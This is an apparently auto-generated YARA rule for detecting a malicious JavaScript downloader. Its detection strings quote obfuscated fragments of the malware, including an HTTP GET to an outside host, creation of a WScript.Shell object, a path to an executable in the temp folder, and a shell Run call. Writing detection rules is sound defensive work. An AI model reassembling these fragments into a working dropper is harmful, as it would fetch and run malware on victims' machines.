rule sig_20160401_62969238d3fe9c0f35760b914478ce79 {
  meta:
    description = "datamaliciousorder - file 20160401_62969238d3fe9c0f35760b914478ce79.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0c057ea18b545e48aaab415682c905e11a42264a83efbdf0938692a8d4890bfb"

  strings:
    $s1  = "KzvBd[BdhLh](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "function QtmWt(EsFto, CxuJd){InIdg = InIdg * 1; return EsFto - CxuJd;};" fullword ascii
    $s3  = "var RpcMrh = function LkoUer() {return WScript[UzfBa](\"WScript\"+\".Shell\");}(), ZqYy = 11;" fullword ascii
    $s4  = "if (KzvBd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YbrPez() {return RpcMrh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MVEkIw0MdO7.ex\" + \"e\";};" fullword ascii
    $s6  = "function KdvBw(){return DaDm + \"\";};" fullword ascii
    $s7  = "function CcMi() {return ((InMw == true) && (InMw == HnVy)) ? 1 : InIdg;};" fullword ascii
    $s8  = "function RmNan(BizGx){RpcMrh[\"R\"+\"un\"](BizGx, InIdg, InIdg);};" fullword ascii
    $s9  = "return QtmWt(CtiKiz, EgfBi);" fullword ascii
    $s10 = "var OilQcd = false;" fullword ascii
    $s11 = "HnVy = true; " fullword ascii
    $s12 = "InMw = true; " fullword ascii
    $s13 = "function UoBr(){return UzfBa;};" fullword ascii
    $s14 = "function KqQwu()" fullword ascii
    $s15 = "var InMw = false;" fullword ascii
    $s16 = "var HnVy = false;" fullword ascii
    $s17 = "function VmwSi(){return 23;};" fullword ascii
    $s18 = "var JkNpj = new this[\"Date\"]();" fullword ascii
    $s19 = "function JgoIwx(YmsBkx) {var KdXe = (1, 2, 3, 4, 5, YmsBkx); return KdXe;};" fullword ascii
    $s20 = "}while (EtBjr);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}